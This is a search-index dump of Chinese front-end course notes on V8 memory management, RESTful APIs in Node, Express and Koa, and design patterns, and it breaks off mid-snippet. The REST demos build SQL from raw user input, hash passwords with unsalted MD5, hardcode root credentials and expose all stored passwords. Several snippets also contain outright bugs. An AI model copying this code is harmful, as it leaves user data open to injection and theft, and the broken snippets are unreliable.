<p>\u8001\u751f\u4ee3\u5185\u5b58\u5904\u7406\u7b97\u6cd5\uff1a\u6807\u8bb0\u3001\u5220\u9664\u3001\u6574\u7406\u4e09\u6b65\uff1a\u6807\u8bb0\u6709\u7528\u7684\u5185\u5b58\u548c\u65e0\u7528\u7684\u5185\u5b58\uff0c\u5220\u9664\u65e0\u7528\u7684\u5185\u5b58\uff0c\u628a\u79bb\u6563\u7684\u6709\u7528\u7684\u5185\u5b58\u6574\u7406\u6210\u8fde\u7eed\u7684\u6709\u7528\u7684\u5185\u5b58\u3002\u4e3a\u4ec0\u4e48\u8981\u6574\u7406\u5185\u5b58\uff0c\u628a\u79bb\u6563\u7684\u5185\u5b58\u5360\u7528\u6574\u7406\u6210\u8fde\u7eed\u7684\u5185\u5b58\u5360\u7528\uff1f\u56e0\u4e3a\u4e00\u90e8\u5206\u53d8\u91cf\u9700\u8981\u8fde\u7eed\u7684\u5185\u5b58\uff08\u4f8b\u5982\u6570\u7ec4\uff0c\u5982\u679c\u90fd\u662f\u5206\u6563\u7684\u5185\u5b58\u5730\u5740\uff0c\u90a3\u4e48\u65e0\u6cd5\u521b\u5efa\u65b0\u7684\u53d8\u91cf\uff09</p> <p>\u5728node\u73af\u5883\u4e0b\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528JS\u4ee3\u7801\u5224\u65ad\u5185\u5b58\u3002Node \u7528C++\u5199\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u624b\u52a8\u6269\u5c55\u5185\u5b58\u3002\u5728\u6d4f\u89c8\u5668\u4e2d\u4e0d\u80fd\u6269\u5c55\u5185\u5b58\u3002</p> <p>\u4ee5\u524d\u7684\u77e5\u8bc6\u4f53\u7cfb\u4e2d\uff0c\u95ed\u5305\u4f1a\u5f71\u54cd\u5185\u5b58\u7684\u6e05\u7406\u3002\u73b0\u5728\u7684\u6280\u672f\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u6240\u4ee5\u770b\u4e66\u7684\u65f6\u5019\u4e00\u5b9a\u6ce8\u610f\u4e66\u7c4d\u7684\u65f6\u95f4\u6548\u5e94\uff08\u89c6\u9891\u8bfe\u7a0b\u4e5f\u4e00\u6837\uff09\u3002</p>"},{"location":"ebook-netease-senior-frontend/02-v8%E5%BC%95%E6%93%8E%E5%9B%9E%E6%94%B6%E5%86%85%E5%AD%98%E7%AE%80%E4%BB%8B/#2v8","title":"2\u3001\u67e5\u770bV8\u5185\u5b58\u4f7f\u7528\u60c5\u51b5","text":""},{"location":"ebook-netease-senior-frontend/02-v8%E5%BC%95%E6%93%8E%E5%9B%9E%E6%94%B6%E5%86%85%E5%AD%98%E7%AE%80%E4%BB%8B/#node","title":"node\u73af\u5883","text":"<p>\u67e5\u770b\u5185\u5b58\u4f7f\u7528\u60c5\u51b5 process.memoryUsage() \u76f4\u63a5\u6267\u884c</p> <pre><code>console.log(process.memoryUsage());\n</code></pre> <p>\u83b7\u53d6\u4e0b\u9762\u7684\u4fe1\u606f</p> <p>{ rss: 21417984,   heapTotal: 7159808,   heapUsed: 4447496,   external: 8224 }</p> <p>\u4e3a\u4e86\u4fbf\u4e8e\u9605\u8bfb\uff0c\u6211\u4eec\u4f7f\u7528\u4e0b\u9762\u7684\u51fd\u6570\u8f6c\u6362\u6210 MB</p> <pre><code>var format = function(bytes) {\n  return (bytes / 1024 / 1024).toFixed(2) + 'MB';\n} \nfunction getMemory() {\n  var mem = process.memoryUsage();\n  var str1 = 'Process: heapTotal ' + format(mem.heapTotal);\n  var str2 = 'heapUsed ' + format(mem.heapUsed);\n  var str3 = 'rss ' + format(mem.rss);\n  return str1 + str2 + str3;\n}\n</code></pre>"},{"location":"ebook-netease-senior-frontend/02-v8%E5%BC%95%E6%93%8E%E5%9B%9E%E6%94%B6%E5%86%85%E5%AD%98%E7%AE%80%E4%BB%8B/#_1","title":"\u6d4f\u89c8\u5668\u73af\u5883","text":"<p>\u5728\u6d4f\u89c8\u5668\u73af\u5883\u4e2d window.performance</p> <p>window.performance.memory</p> <p>totalJSHeapSize/usedJSHeapSize/jsHeapSizeLimit \u5224\u65ad\u4f7f\u7528\u7684\u6bd4\u4f8b</p>"},{"location":"ebook-netease-senior-frontend/02-v8%E5%BC%95%E6%93%8E%E5%9B%9E%E6%94%B6%E5%86%85%E5%AD%98%E7%AE%80%E4%BB%8B/#v8","title":"V8\u5982\u4f55\u5904\u7406\u53d8\u91cf\u548c\u5185\u5b58\u5462\uff1f","text":"<p>\u5185\u5b58\u4e3b\u8981\u7528\u4e8e\u5b58\u50a8\u6570\u636e\uff08\u53d8\u91cf\uff09\u3002\u53d8\u91cf\u5206\u4e3a\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf\uff1a\u5168\u5c40\u53d8\u91cf\u59cb\u7ec8\u5b58\u5728\uff0c\u76f4\u5230\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u675f\uff1b\u5c40\u90e8\u53d8\u91cf\u4f1a\u5f53\u7a0b\u5e8f\u6267\u884c\u7ed3\u675f\uff0c\u5e76\u6ca1\u6709\u5916\u90e8\u5f15\u7528\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u5220\u9664\u53d8\u91cf\uff0c\u91ca\u653e\u5185\u5b58\u3002</p> <pre><code>// \u907f\u514d\u4f7f\u7528\u5f88\u591a\u5168\u5c40\u53d8\u91cf\nvar size = 20 * 1024 * 1024;\nvar arr = new Array(size);\n\n// \u4f7f\u7528\u51fd\u6570\u907f\u514d\u5168\u5c40\u53d8\u91cf\nfunction b() {\n  var arr = new Array(size);\n}\nb();\n</code></pre> <p>test.js</p> <pre><code>var http = require('http');\nvar a = [];\n\nhttp.createServer(function() {\n  function getMe() {\n    //\n  }\n  a.push(new Array(20 * 1024 * 1024));\n  getMe();\n}).listen(3000);\n</code></pre>"},{"location":"ebook-netease-senior-frontend/02-v8%E5%BC%95%E6%93%8E%E5%9B%9E%E6%94%B6%E5%86%85%E5%AD%98%E7%AE%80%E4%BB%8B/#3","title":"3\u3001\u5185\u5b58\u4f18\u5316\u5b9e\u4f8b","text":"<ul> <li>\u5c3d\u91cf\u4e0d\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf</li> <li>\u5168\u5c40\u53d8\u91cf\u4f7f\u7528\u540e\u8981\u9500\u6bc1</li> <li>\u533f\u540d\u51fd\u6570\u81ea\u6267\u884c\u628a\u5168\u5c40\u53d8\u91cf\u8f6c\u6362\u6210\u5c40\u90e8\u53d8\u91cf</li> <li>\u5c3d\u91cf\u907f\u514d\u95ed\u5305\u540e\u5916\u90e8\u5f15\u7528</li> </ul> <p>\u9500\u6bc1\u53d8\u91cf\u65f6\uff0c\u63a8\u8350\u4f7f\u7528 null undefined\uff0c\u4e0d\u4f7f\u7528 delete\uff08\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\u6709\u95ee\u9898\uff09\uff1b\u5bf9\u4e8eReact\uff0c\u5728\u7ec4\u4ef6\u5378\u8f7d\u9636\u6bb5\uff0c\u6216\u8005\u4e0d\u4f7f\u7528\u8fd9\u4e2a\u5168\u5c40\u53d8\u91cf\u65f6\uff0c\u5c31\u79fb\u9664\u8fd9\u4e2a\u53d8\u91cf\uff0c\u91ca\u653e\u5185\u5b58\u3002</p> <p>\u5982\u4f55\u653e\u7f6e\u5185\u5b58\u6cc4\u6f0f\uff1f</p> <ul> <li>\u907f\u514d\u6ee5\u7528\u7f13\u5b58\uff1a\u5f53\u7f13\u5b58\u7684\u5185\u5bb9\u5f88\u591a\uff08\u5224\u65ad\u7f13\u5b58\u6570\u7ec4\u7684\u957f\u5ea6\uff09\uff0c\u6e05\u7a7a\u65e9\u671f\u7684\u7f13\u5b58\u6570\u636e\uff0c\u52a0\u4e00\u4e2a\u9501\u63d0\u793a\u7f13\u5b58\u8fc7\u591a\uff08\u5b9e\u9645\u9879\u76ee\u4e2d\u7684undo-redo\u5b58\u50a8\u8fd9\u64cd\u4f5c\uff09</li> </ul> <pre><code>let cache = []; // \u7f13\u5b58\u901a\u5e38\u5b58\u653e\u5728\u5168\u5c40\n\n// \u6570\u636e\u64cd\u4f5c\u540e\u653e\u5165\u7f13\u5b58\n// cache.push(item);\n\n// \u5982\u679c\u7f13\u5b58\u5f88\u5927\uff0c\u6e05\u7a7a\u4e00\u90e8\u5206\u7f13\u5b58\nif (cache.length &gt; 10) {\n  cache.shift();\n}\n\n// \u7ec4\u4ef6\u5378\u8f7d\u65f6\u6e05\u7a7a\u7f13\u5b58\ncache = null;\n</code></pre> <ul> <li>\u51cf\u5c11\u5927\u5185\u5b58\u64cd\u4f5c\uff1a\u524d\u7aef\u4e0a\u4f20\u5927\u6587\u4ef6\u4f7f\u7528\u5206\u7247\u957f\u4f20\u6280\u672f\uff1b\u540e\u7aef\u6587\u4ef6\u6d41\u6280\u672f\u3002\u524d\u7aef\u9700\u8981\u628a\u5927\u6587\u4ef6\u6d41\uff0c\u8c03\u7528 slice \u65b9\u6cd5\u540e\u5207\u7247\uff0c\u7136\u540e\u5faa\u73af\u4e0a\u4f20\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u5927\u91cf\u5185\u5b58\uff08\u5982\u679c\u4e0a\u4f20\u4e00\u4e2a5G\u7684\u6587\u4ef6\uff0c\u5207\u7247\u4e0a\u4f20\uff09</li> </ul> <pre><code>import { createReadStream, write } from 'fs';\n\nfs.readFile();\n// readFile \u662f\u4e00\u6b21\u6027\u8bfb\u53d6\u6587\u4ef6\u5230buffer\uff0c\u9002\u5408\u5c0f\u6587\u4ef6\u4e0a\u4f20\ncreateReadStream().pipe(write);\n\n// \u4e0a\u4f20\u5927\u6587\u4ef6\u4f7f\u7528\u5207\u7247\u65b9\u6cd5\uff1a file \u662f\u4e00\u4e2a blob \u5bf9\u8c61\uff0c\u5177\u6709 slice \u65b9\u6cd5\nfile.slice(0, 1000);\nfile.slice(1000, 2000);\n</code></pre>"},{"location":"ebook-netease-senior-frontend/03-node%E4%B8%8B%E9%9D%A2%E7%9A%84Restful%E5%AE%9E%E7%8E%B0/","title":"03-nodeJS \u4e2d Restful \u67b6\u6784\u5b9e\u73b0","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 6348  \u9605\u8bfb13\u5206\u949f</p>"},{"location":"ebook-netease-senior-frontend/03-node%E4%B8%8B%E9%9D%A2%E7%9A%84Restful%E5%AE%9E%E7%8E%B0/#1-restful","title":"1\u3001\u4ec0\u4e48\u662f restful","text":"<p>Restful\uff1a\u8868\u8ff0\u6027\u72b6\u6001\u8f6c\u79fb\uff08\u6846\u67b6\u7684\u539f\u5219\u548c\u7ea6\u675f\u6761\u4ef6\uff09\u4e3b\u8981\u7528\u4e8e\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4ea4\u4e92\u7c7b\u7684\u8f6f\u4ef6\u3002\u57fa\u4e8e\u8fd9\u4e2a\u98ce\u683c\u8bbe\u8ba1\u7684\u8f6f\u4ef6\u4f1a\u66f4\u7b80\u6d01\uff0c\u66f4\u6709\u5c42\u6b21\uff0c\u5b9e\u73b0\u7f13\u5b58\u673a\u5236\u3002\u8fd9\u662f\u4e00\u79cdURL\u7684\u8bbe\u8ba1\u98ce\u683c\uff08\u8def\u7531\u98ce\u683c\uff09\u3002</p> <p>Restful\uff1a\u901a\u4fd7\u7684\u8bf4\uff0c\u7528\u4ec0\u4e48\u6837\u7684\u65b9\u5f0f\u5199\u8def\u7531\u3002\u5e38\u89c1\u7684URL\u98ce\u683c\uff1a\u9759\u6001 news/ids/1 \u5229\u4e8eSEO\u4f18\u5316\uff1b\u52a8\u6001 news?id=1 \u4e0d\u5229\u4e8eSEO\uff08\u540e\u9762\u7684\u67e5\u8be2\u53c2\u6570\uff09\u539f\u6765\u662f\u901a\u8fc7HTTP\u8bf7\u6c42\u7684\u5185\u5bb9\u5224\u65ad\u5177\u4f53\u7684\u4e1a\u52a1\u903b\u8f91\uff08\u589e\u5220\u6539\u67e5\uff09restful\u901a\u8fc7HTTP\u8bf7\u6c42\u7684\u7c7b\u578b\uff08get post delete\uff09\u5224\u65ad\u4e1a\u52a1\u903b\u8f91\u3002\u540c\u4e00\u4e2a\u8d44\u6e90\u4f7f\u7528\u540c\u4e00\u4e2aURL\uff0c\u5177\u4f53\u64cd\u4f5c\u6839\u636e\u8bf7\u6c42\u7684\u65b9\u6cd5\u5b9e\u73b0\u3002</p> <p>\u4f20\u7edf\u7684URL http://127.0.0.1:user/delete/id \u8fd9\u6837\u7684URL\u4e2d\u542b\u6709\u589e\u5220\u6539\u67e5\u5b57\u6837\u63cf\u8ff0\u6027\u7684URL\uff0c\u548c HTTP \u8bbe\u8ba1\u7406\u5ff5\u4e0d\u7b26\u5408\u3002\u56e0\u4e3a HTTP \u8bf7\u6c42\u63a5\u53e3\u6216\u8005\u5730\u5740\u7684\u65f6\u5019\u5b8c\u5168\u6ca1\u6709\u5fc5\u8981\u53bb\u63cf\u8ff0\uff08HTTP\u672c\u8eab\u6ca1\u6709\u8bed\u4e49\uff09\u3002</p> <p>restful\uff1a\u9762\u5411\u8d44\u6e90\uff08user\uff09\u5bf9\u4e8e\u540c\u4e00\u4e2a\u8d44\u6e90\uff0c\u90fd\u5728\u4e00\u4e2aURL\u4e0b\u64cd\u4f5c\uff0c\u6839\u636e\u5224\u65adHTTP\u7684\u8bf7\u6c42\u7684\u7c7b\u578b\u51b3\u5b9a\u505a\u4e0d\u540c\u7684\u4e8b\u60c5\u3002HTTP \u4e0d\u540c\u7684\u8bf7\u6c42\u7c7b\u578b\uff08GET POST PUT DELETE\uff09\u5bf9\u5e94\u4e0d\u540c\u7684\u6570\u636e\u5e93\u64cd\u4f5c\uff08\u589e\u5220\u6539\u67e5\uff09\u3002</p> <p>Node\u9876\u5c42\u8def\u7531\uff1a\u4e00\u4e2a\u8def\u7531\u4e0d\u4e00\u5b9a\u5bf9\u5e94\u4e00\u4e2a\u754c\u9762\uff08\u4e00\u4e2aHtml\u6587\u4ef6\uff09http\u5904\u7406\u51fd\u6570\uff08\u8def\u7531\u98ce\u683c\uff09\u67b6\u6784\u548c\u4e1a\u52a1\u5c42\u5df2\u7ecf\u8131\u79bb\u5173\u7cfb\u4e86\uff0c\u67b6\u6784\u662f\u901a\u7528\u7684\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"ebook-netease-senior-frontend/03-node%E4%B8%8B%E9%9D%A2%E7%9A%84Restful%E5%AE%9E%E7%8E%B0/#2-restful","title":"2\u3001\u539f\u751f\u5b9e\u73b0 Restful","text":"<p>\u539f\u751fNodeJS\u5b9e\u73b0\u670d\u52a1</p> <p>\u539f\u751f\u5b9e\u73b0 Restful</p> <pre><code>npm install -D mysql body-parser\nnpm install co-mysql md5-node\n</code></pre> <p>Index.js</p> <pre><code>const http = require('http');\nconst mysql = require('mysql');\nconst co = require('co-mysql');\nconst md5 = require('md5-node');\n\nlet db = mysql.createPool({\n  host: 'localhost',\n  user: 'root',\n  password: 'root',\n  database: 'user',\n});\nlet conn = co(db);\n\n// \u540c\u4e00\u4e2aURL\u4e0b\u5b9e\u73b0\u4e0d\u540c\u7684\u64cd\u4f5c\nconst app = http.createServer((req, res) =&gt; {\n  if (req.method === \"POST\") {\n    if (req.url === './user') {\n      // res.end(JSON.stringify({\n      //   message: 'POST\u64cd\u4f5c',\n      //   status: 200\n      // }))\n      let arr = [];\n      req.on('data', (data) =&gt; {\n        arr.push(data);\n      })\n      req.on('end', async () =&gt; {\n        let buffer = Buffer.concat(arr);\n        let { username, password } = JSON.parse(buffer.toString());\n        let data = await conn.query(`select user from admin where user = '${username}'`);\n        console.log(data);\n        // \u5982\u679c\u4ece\u6570\u636e\u5e93\u4e2d\u68c0\u7d22\u5230\uff0c\u8fd4\u56de\u5df2\u7ecf\u6ce8\u518c\n        if (data.length &gt;= 1) {\n          res.end(JSON.stringify({\n            \"statue\": 200,\n            \"message\": \"\u7528\u6237\u540d\u5df2\u7ecf\u6ce8\u518c\"\n          }));\n        } else {\n          // \u5982\u679c\u4ece\u6570\u636e\u5e93\u4e2d\u6ca1\u6709\u68c0\u7d22\u5230\uff0c\u76f4\u63a5\u5199\u5165\u6570\u636e\u5e93\n          password = md5(password);\n          let sql = `insert into admin (user,password) values ('${username}', '${password}')`;\n          await conn.query(sql);\n          res.end(JSON.stringify({\n            'status': 200,\n            'message': '\u6ce8\u518c\u6210\u529f'\n          }));\n        }\n      });\n    }\n  } else if (req.method === \"GET\") {\n    if (req.url === './user') {\n      // res.end(JSON.stringify({\n      //   message: 'GET\u64cd\u4f5c',\n      //   status: 200\n      // }))\n      let sql = 'select id, user, password from admin';\n      let data = await conn.query(sql);\n      res.end(JSON.stringify(data));\n    }\n  }\n}).listen(3000);\n</code></pre> <p>REST client \u914d\u7f6e .http</p> <pre><code>@url = http://localhost:3000\n@type = Content-Type: application/json\n\nGET {{url}}/user HTTP/1.1\n\nPOST {{url}}/user HTTP/1.1\n{{type}}\n\n{\n    \"username\": \"admin\",\n    \"password\": 123456\n}\n</code></pre>"},{"location":"ebook-netease-senior-frontend/03-node%E4%B8%8B%E9%9D%A2%E7%9A%84Restful%E5%AE%9E%E7%8E%B0/#3-restful","title":"3\u3001\u6846\u67b6\u5b9e\u73b0 RestFul","text":"<p>express\u5b9e\u73b0\u670d\u52a1\uff1a\u6539\u5199\u4e86\u5f02\u6b65\u8bf7\u6c42\u548c\u56de\u8c03\u51fd\u6570\uff0c\u4f7f\u7528 generator \u5b9e\u73b0\u5f02\u6b65\u64cd\u4f5c</p>"},{"location":"ebook-netease-senior-frontend/03-node%E4%B8%8B%E9%9D%A2%E7%9A%84Restful%E5%AE%9E%E7%8E%B0/#demo-01-express","title":"Demo 01 Express \u5b9e\u73b0","text":"<p>\u4f7f\u7528 NodeJS \u7684 express \u521b\u5efa\u4e00\u4e2a\u6848\u4f8b</p> <pre><code>npm init\nnpm install -D express\ntouch app.js\nnodemon app.js\n# nodemon \u662f\u81ea\u52a8\u66f4\u65b0\u7684node\uff08\u7c7b\u4f3c\u4e8e\u70ed\u542f\u52a8\uff09\n</code></pre> <p>app.js</p> <pre><code>const express = require('express');\nconst app = express();\n\napp.get('/user', (req, res) =&gt; {\n  res.send('test page');\n});\n\napp.listen(3000);\n</code></pre> <p>URL \u5b9a\u4f4d\u8d44\u6e90\uff0cHTTP\u63cf\u8ff0\u64cd\u4f5c</p> <p>\u9876\u5c42\u8def\u7531\u8bbe\u8ba1\uff1a\u4e0d\u9700\u8981\u6709\u7269\u7406\u6587\u4ef6\u53bb\u6620\u5c04\u8def\u7531</p>"},{"location":"ebook-netease-senior-frontend/03-node%E4%B8%8B%E9%9D%A2%E7%9A%84Restful%E5%AE%9E%E7%8E%B0/#demo02","title":"Demo02","text":"<p>Express \u5b9e\u73b0 restful</p> <pre><code>const express = require('express');\nconst http = require('http');\nconst mysql = require('mysql');\nconst co = require('co-mysql');\nconst md5 = require('md5-node');\nconst bodyparse = require('body-parser')\n\nconst app = express();\n\nlet db = mysql.createPool({\n  host: 'localhost',\n  user: 'admin',\n  password: 'root',\n  database: 'test-user',\n});\n\nlet conn = co(db);\n\napp.use(bodyparse.urlencoded({\n  extended: true\n}));\n\napp.use(bodyparse.json());\n\napp.post('/user', async (req, res) =&gt; {\n  let { user, password } = req.body;\n  let data = await conn.query(`select user from admin where user = '${username}'`);\n    if (data.length &gt;= 1) {\n    res.send(JSON.stringify({\n      'status': 200,\n      'message': '\u7528\u6237\u540d\u5df2\u7ecf\u6ce8\u518c'\n    }))\n  } else {\n    password = md5(password);\n    let sql = `insert into admin (user,password) values ('${username}','${password}')`;\n    await conn.query(sql);\n    res.end(JSON.stringify({\n      'status': 200,\n      'message': '\u6ce8\u518c\u6210\u529f'\n    }));\n  }\n});\n\napp.get('/user/:id', (req, res) =&gt; {\n  res.send(req.params.id);\n  // \u5230\u6570\u636e\u5e93\u4e2d\u67e5\u8be2\uff08sql\uff09\n});\n\napp.listen(3000);\n</code></pre>"},{"location":"ebook-netease-senior-frontend/03-node%E4%B8%8B%E9%9D%A2%E7%9A%84Restful%E5%AE%9E%E7%8E%B0/#demo03","title":"demo03","text":"<p>koa \u5b9e\u73b0 restful</p> <p>koa\uff1aasync await </p> <p>config.js</p> <pre><code>module.exports = {\n  host: 'localhost',\n  user: 'root',\n  password: 'root',\n  database: 'user',\n};\n</code></pre> <p>Databases.js</p> <pre><code>const mysql = require('mysql');\nconst co = require('co-mysql');\nconst config = require('../config');\n\nconst { host, user, password, database } = config;\nlet db = mysql.createPool({\n  host,\n  user,\n  password,\n  database,\n});\n\nmodule.exports = co(db);\n</code></pre> <p>index.js</p> <pre><code>const Router = require('koa-router');\nconst md5 = require('md5-node');\nconst router = new Router();\n\nrouter.get('/user', async ctx =&gt; {\n  ctx.body = 'main page';\n});\n</code></pre> <p>app.js</p> <pre><code>const Koa = require('koa');\nconst Router = require('koa-router');\nconst body = require('koa-bodyparser');\n\nconst app = new Koa();\nconst router = new Router();\napp.context.db = require('./libs/databases');\napp.context.config = config;\n\napp.use(body());\nrouter.user('/api', require('./router'));\n\napp.use(router.routes());\napp.listen(3000);\n</code></pre>"},{"location":"ebook-netease-senior-frontend/04-%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E7%9A%84%E6%8F%90%E5%8D%87%E2%80%94%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%88%91%E4%BB%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E5%8F%AF%E6%89%A9%E5%B1%95%E6%80%A7/","title":"04-\u7f16\u7a0b\u601d\u60f3\u7684\u63d0\u5347\u2014\u63d0\u9ad8\u4ee3\u7801\u53ef\u6269\u5c55\u6027","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 7810  \u9605\u8bfb16\u5206\u949f</p> <p>\u4ee3\u7801\u7684\u53ef\u6269\u5c55\u6027\uff1a\u672c\u8d28\u4e0a\u5c31\u662f\u4f7f\u7528\u4e0d\u540c\u7684\u8bbe\u8ba1\u6a21\u5f0f\u4f18\u5316\u4ee3\u7801\u3002\u7a0b\u5e8f\u7684\u53ef\u6269\u5c55\u6027\u548c\u4ea7\u54c1\u529f\u80fd\u7684\u53ef\u6269\u5c55\u6027\u3002</p> <p>\u63d0\u9ad8\u53ef\u6269\u5c55\u6027\u7684\u76ee\u7684\uff1a\u9762\u5bf9\u9700\u6c42\u53d8\u66f4\uff0c\u65b9\u4fbf\u5feb\u901f\u66f4\u6539\u4ee3\u7801\uff1b\u51cf\u5c11\u4ee3\u7801\u4fee\u6539\u8fc7\u7a0b\u7684\u96be\u5ea6\u3002</p>"},{"location":"ebook-netease-senior-frontend/04-%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E7%9A%84%E6%8F%90%E5%8D%87%E2%80%94%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%88%91%E4%BB%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E5%8F%AF%E6%89%A9%E5%B1%95%E6%80%A7/#_1","title":"\u54ea\u4e9b\u8bbe\u8ba1\u6a21\u5f0f\u53ef\u4ee5\u4fdd\u8bc1\u4ee3\u7801\u7684\u53ef\u6269\u5c55\u6027","text":"<p>\u66f4\u6539\u65b9\u6cd5\uff1a\u88c5\u9970\u8005\u6a21\u5f0f\u548c\u9002\u914d\u5668\u6a21\u5f0f</p>"},{"location":"ebook-netease-senior-frontend/04-%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E7%9A%84%E6%8F%90%E5%8D%87%E2%80%94%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%88%91%E4%BB%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E5%8F%AF%E6%89%A9%E5%B1%95%E6%80%A7/#_2","title":"\u88c5\u9970\u8005\u6a21\u5f0f","text":"<p>\u5982\u679c\u4e00\u4e2a\u65e7\u65b9\u6cd5\u5df2\u7ecf\u5199\u597d\uff0c\u9700\u8981\u589e\u52a0\u4e00\u4e2a\u65b0\u7684\u529f\u80fd\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u65b9\u4fbf\u66f4\u6539\u65e7\u65b9\u6cd5\uff08\u5176\u4ed6\u5730\u65b9\u53ef\u80fd\u4f7f\u7528\u65e7\u65b9\u6cd5\uff09\u6216\u8005\u4e0d\u80fd\u66f4\u6539\uff08\u7b2c\u4e09\u65b9\u5e93\u63d0\u4f9b\u7684\u65b9\u6cd5\uff09\uff0c\u6240\u4ee5\u91c7\u7528\u88c5\u9970\u8005\u6a21\u5f0f\u3002</p> <p>\u7b80\u5355\u7684\u8bf4\uff0c\u5c31\u662f\u628a\u539f\u6765\u7684\u65b9\u6cd5\u5305\u88c5\u4e00\u4e0b\uff0c\u589e\u52a0\u65b0\u7684\u529f\u80fd\u3002</p> <p>\u88c5\u9970\u8005\u6a21\u5f0f\u5173\u6ce8\u7684\u662f\u5185\u90e8\u7684\u529f\u80fd</p> <pre><code>function a() {\n  console.log('Hello');\n}\nfunction sayHelllo (name) {\n  a();\n  console.log(name);\n}\n\n// \u7ed9ajax\u52a0\u4e0a\u4e00\u4e2a\u9ed8\u8ba4\u7684\u52a8\u753b\u6548\u679c\nvar ajax = $.ajax;\n$.ajax = function() {\n  ajax.call(this);\n  loading();\n}\n// \u6b64\u65f6\u5df2\u7ecf\u7528\u81ea\u5df1\u5199\u7684\u4ee3\u7801\u8986\u76d6\u4e86\u539f\u751f\u7b2c\u4e09\u65b9\u5e93\u7684ajax\u65b9\u6cd5\n\n// \u4e0b\u9762\u7ed9\u70b9\u51fb\u4e8b\u4ef6\u589e\u52a0\u4e00\u4e2a\u6548\u679c\ndom.onclick = function() {\n  console.log(1);\n}\nvar oldFn = dom.onclick;\ndom.onclick = function() {\n  oldFn();\n  loading();\n}\noldFn = null;\n</code></pre>"},{"location":"ebook-netease-senior-frontend/04-%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E7%9A%84%E6%8F%90%E5%8D%87%E2%80%94%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%88%91%E4%BB%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E5%8F%AF%E6%89%A9%E5%B1%95%E6%80%A7/#_3","title":"\u9002\u914d\u5668\u6a21\u5f0f","text":"<p>\u7c7b\u4f3c\u4e8e\u751f\u6d3b\u4e2d\u7684\u5b89\u5353\u63a5\u53e3\u8f6c\u6362\u6210\u82f9\u679c\u63a5\u53e3\u3002</p> <p>\u4e00\u4e2a\u6a21\u5757\u9700\u8981\u7684\u65b9\u6cd5\u548c\u53e6\u4e00\u4e2a\u6a21\u5757\u63d0\u4f9b\u7684\u63a5\u53e3\u4e0d\u4e00\u81f4\u3002\u5173\u6ce8\u7684\u662f\u4e24\u4e2a\u6a21\u5757\u95f4\u7684\u63a5\u53e3\u3002</p> <p>\u539f\u6765\u6709\u4e00\u4e2aA\u7c7b\uff0c\u6709\u4e00\u4e2aB\u7c7b\uff0c\u73b0\u5728\u60f3\u8981\u8ba9A\u7c7b\u5177\u6709B\u7c7b\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u4e0d\u8981\u66f4\u6539A\u7c7b\u5185\u90e8\u4ee3\u7801\u3002\u6240\u4ee5\u53ef\u4ee5\u5199\u4e00\u4e2a\u9002\u914d\u5668 Adapter\u7c7b\uff0c\u7ee7\u627f\u81eaA\u7c7b\uff0c\u5e76\u4e14\u589e\u52a0\u4e86B\u7c7b\u7684\u65b9\u6cd5\u3002\u8fd9\u6837\u65b0\u7684\u9002\u914d\u5668\u5c31\u80fd\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\uff0c\u540c\u65f6\u4e0d\u66f4\u6539\u539f\u6765\u7c7b\u3002</p> <p>\u8fd9\u4e2a\u9002\u5408\u4e8e\u4e24\u4e2a\u4e0d\u540c\u7684\u7c7b\uff08\u53ef\u80fd\u662f\u7b2c\u4e09\u65b9\u7684\u7c7b\uff09\uff0c\u7136\u540e\u7edf\u4e00\u6210\u4e00\u4e2a\u9002\u914d\u5668\u7c7b\uff0c\u53ef\u4ee5\u540c\u65f6\u8c03\u7528\u8fd9\u4e24\u4e2a\u7c7b\u7684API\u3002\u5982\u679c\u4e24\u4e2a\u6a21\u5757\u5185\u90e8\u5b8c\u5168\u4e0d\u540c\uff0c\u90a3\u4e48\u4e0d\u9002\u5408\u8fd9\u4e2a\u8bbe\u8ba1\u6a21\u5f0f\u3002</p> <p>\u4f8b\u5982\u6211\u4eec\u6709\u4e00\u4e2a\u5b89\u5353\u5145\u7535\u5668\uff0c\u6709\u4e00\u4e2a\u82f9\u679c\u8bbe\u5907\u9700\u8981\u5145\u7535\u3002\u6211\u4eec\u4e0d\u80fd\u6539\u53d8\u5145\u7535\u5668\u548c\u82f9\u679c\u8bbe\u5907\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u589e\u52a0\u4e00\u4e2a\u8f6c\u63a5\u5668\uff0c\u628a\u5b89\u5353\u7684\u63a5\u53e3\u8f6c\u6362\u6210\u82f9\u679c\u7684\u63a5\u53e3</p> <p>\u4f8b\u5982\u6709\u4e00\u4e2adog class\uff0c\u60f3\u8981\u8ba9\u72d7\u6709\u5176\u4ed6\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u4e0d\u80fd\u66f4\u6539\u539f\u59cb\u72d7\u8fd9\u4e2a\u7c7b\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u9002\u914d\u5668\uff08\u8f6c\u63a5\u7ebf\uff09\u3002</p> <pre><code>function dog() {\n}\n\ndog.ptototype.sayHello = function() {\n    